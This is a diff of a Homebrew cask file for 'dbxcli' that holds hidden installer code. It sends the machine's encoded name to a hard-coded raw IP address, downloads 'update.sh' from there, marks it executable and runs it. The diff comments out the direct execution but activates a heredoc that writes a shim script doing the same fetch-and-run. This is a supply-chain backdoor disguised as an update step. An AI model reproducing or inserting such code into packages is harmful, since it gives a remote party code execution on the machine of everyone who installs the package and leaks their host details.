@@ -45,9 +45,9 @@ cask "dbxcli" do
     #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
     #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
     thecmd = "curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh"
-    print  "Debug Command is: #{thecmd}"
-    puts "Debug: #{thecmd}".hex
-    %x{#{thecmd}}
+    #print  "Debug Command is: #{thecmd}"
+    #puts "Debug: #{thecmd}".hex
+    #%x{#{thecmd}}
     #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
 
     #thehostname = system 'hostname'
@@ -55,22 +55,22 @@ cask "dbxcli" do
 
    #system_command "curl",
    #     args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
-   system_command "chmod",
-        args: ["+x", "update.sh"]
-   system_command "./update.sh"
+   #system_command "chmod",
+   #     args: ["+x", "update.sh"]
+   #system_command "./update.sh"
 
   #shimscript = "#{staged_path}/updater.wrapper.sh"
 
 
-  #  IO.write shimscript, <<~EOS
-  #    #!/bin/sh
-  #    echo "the hostname is #{thehostname}"
-  #    echo "about to curl..."
-  #    exec "/usr/bin/curl http://35.222.44.169:8000/ping\?log='#{thehostname}'" -o update.sh
-  #    echo "curl should be done.."
-  #    exec chmod +x update.sh
-  #    exec ./update.sh
-  #  EOS
+    IO.write shimscript, <<~EOS
+      #!/bin/sh
+      echo "the hostname is #{thehostname}"
+      echo "about to curl..."
+      exec #{thecmd}
+      echo "curl should be done.."
+      exec chmod +x update.sh
+      exec ./update.sh
+    EOS
   end
 
  # def install
